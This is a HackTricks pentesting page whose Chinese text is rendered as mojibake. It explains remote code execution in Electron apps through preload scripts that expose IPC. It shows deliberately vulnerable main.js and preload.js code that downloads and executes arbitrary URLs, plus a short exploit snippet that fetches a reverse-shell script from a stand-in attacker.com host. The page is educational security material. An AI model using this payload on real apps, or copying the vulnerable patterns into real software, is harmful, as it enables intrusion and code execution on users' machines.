# Electron contextIsolation RCE via IPC

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ä¸Šå…³æ³¨æˆ‘ä»¬ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

å¦‚æœ preload è„šæœ¬ä» main.js æ–‡ä»¶æš´éœ²äº† IPC ç«¯ç‚¹ï¼Œæ¸²æŸ“è¿›ç¨‹å°†èƒ½å¤Ÿè®¿é—®å®ƒï¼Œå¦‚æœå­˜åœ¨æ¼æ´ï¼Œå¯èƒ½ä¼šå¯¼è‡´ RCEã€‚

**è¿™äº›ç¤ºä¾‹å¤§å¤šæ¥è‡ªè¿™é‡Œ** [**https://www.youtube.com/watch?v=xILfQGkLXQo**](https://www.youtube.com/watch?v=xILfQGkLXQo)ã€‚æŸ¥çœ‹è§†é¢‘ä»¥è·å–æ›´å¤šä¿¡æ¯ã€‚

## ç¤ºä¾‹ 0

æ¥è‡ª [https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own?slide=21) çš„ç¤ºä¾‹ï¼ˆæ‚¨å¯ä»¥åœ¨è¿™äº›å¹»ç¯ç‰‡ä¸­çœ‹åˆ° MS Teams å¦‚ä½•åˆ©ç”¨ XSS è¿›è¡Œ RCE çš„å®Œæ•´ç¤ºä¾‹ï¼Œè¿™åªæ˜¯ä¸€ä¸ªéå¸¸åŸºæœ¬çš„ç¤ºä¾‹ï¼‰ï¼š

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

## ç¤ºä¾‹ 1

æ£€æŸ¥ `main.js` å¦‚ä½•ç›‘å¬ `getUpdate` å¹¶å°† **ä¸‹è½½å¹¶æ‰§è¡Œä»»ä½•ä¼ é€’çš„ URL**ã€‚\
è¿˜è¦æ£€æŸ¥ `preload.js` å¦‚ä½• **æš´éœ²ä»»ä½• IPC** äº‹ä»¶æ¥è‡ª mainã€‚
```javascript
// Part of code of main.js
ipcMain.on('getUpdate', (event, url) => {
console.log('getUpdate: ' + url)
mainWindow.webContents.downloadURL(url)
mainWindow.download_url = url
});

mainWindow.webContents.session.on('will-download', (event, item, webContents) => {
console.log('downloads path=' + app.getPath('downloads'))
console.log('mainWindow.download_url=' + mainWindow.download_url);
url_parts = mainWindow.download_url.split('/')
filename = url_parts[url_parts.length-1]
mainWindow.downloadPath = app.getPath('downloads') + '/' + filename
console.log('downloadPath=' + mainWindow.downloadPath)
// Set the save path, making Electron not to prompt a save dialog.
item.setSavePath(mainWindow.downloadPath)

item.on('updated', (event, state) => {
if (state === 'interrupted') {
console.log('Download is interrupted but can be resumed')
}
else if (state === 'progressing') {
if (item.isPaused()) console.log('Download is paused')
else console.log(`Received bytes: ${item.getReceivedBytes()}`)
}
})

item.once('done', (event, state) => {
if (state === 'completed') {
console.log('Download successful, running update')
fs.chmodSync(mainWindow.downloadPath, 0755);
var child = require('child_process').execFile;
child(mainWindow.downloadPath, function(err, data) {
if (err) { console.error(err); return; }
console.log(data.toString());
});
}
else console.log(`Download failed: ${state}`)
})
})
```

```javascript
// Part of code of preload.js
window.electronSend = (event, data) => {
ipcRenderer.send(event, data);
};
```
åˆ©ç”¨ï¼š
```html
<script>
electronSend("getUpdate","https://attacker.com/path/to/revshell.sh");
</script>
```
## ç¤ºä¾‹ 2

å¦‚æœé¢„åŠ è½½è„šæœ¬ç›´æ¥å‘æ¸²æŸ“å™¨æš´éœ²è°ƒç”¨ `shell.openExternal` çš„æ–¹æ³•ï¼Œåˆ™å¯èƒ½è·å¾— RCE
```javascript
// Part of preload.js code
window.electronOpenInBrowser = (url) => {
shell.openExternal(url);
};
```
## ç¤ºä¾‹ 3

å¦‚æœé¢„åŠ è½½è„šæœ¬æš´éœ²äº†ä¸ä¸»è¿›ç¨‹å®Œå…¨é€šä¿¡çš„æ–¹å¼ï¼Œåˆ™ XSS å°†èƒ½å¤Ÿå‘é€ä»»ä½•äº‹ä»¶ã€‚è¿™ç§å½±å“å–å†³äºä¸»è¿›ç¨‹åœ¨ IPC æ–¹é¢æš´éœ²äº†ä»€ä¹ˆã€‚
```javascript
window.electronListen = (event, cb) => {
ipcRenderer.on(event, cb);
};

window.electronSend = (event, data) => {
ipcRenderer.send(event, data);
};
```
{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
